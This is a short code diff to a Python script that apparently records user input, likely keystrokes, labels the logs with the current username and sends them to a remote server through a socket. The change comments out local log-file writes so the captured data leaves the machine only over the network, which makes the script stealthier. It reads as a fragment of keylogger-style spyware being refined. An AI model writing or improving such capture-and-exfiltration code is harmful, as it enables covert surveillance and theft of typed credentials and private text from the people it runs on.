@@ -46,9 +46,9 @@ def writeToFileHuman(lPath, lName, strh):
         thread_write_server = threading.Thread(target=(client_socket.sendall(strh.encode('utf-8'))))
         thread_write_server.start()
 
-    newLog = open(lPath + lName, "a")
+    """newLog = open(lPath + lName, "a")
     newLog.write(strh)
-    newLog.close()
+    newLog.close()"""
 
 def main():
     tempLogName = str(datetime.now().strftime("%Y-%m-%d %H.%M.%S")) + "_" + getpass.getuser()
@@ -59,8 +59,8 @@ def main():
         tempLog = recording()
         strh = str(tempLog)
 
-        thread_write_raw = threading.Thread(target=writeToFileRaw, args=(logsPath,tempLogName+".raw",strh + "\n"))
-        thread_write_raw.start()
+        #thread_write_raw = threading.Thread(target=writeToFileRaw, args=(logsPath,tempLogName+".raw",strh + "\n"))
+        #thread_write_raw.start()
         thread_write_human = threading.Thread(target=writeToFileHuman, args=(logsPath, tempLogName+".txt", strh + "\n"))
         thread_write_human.start()
         
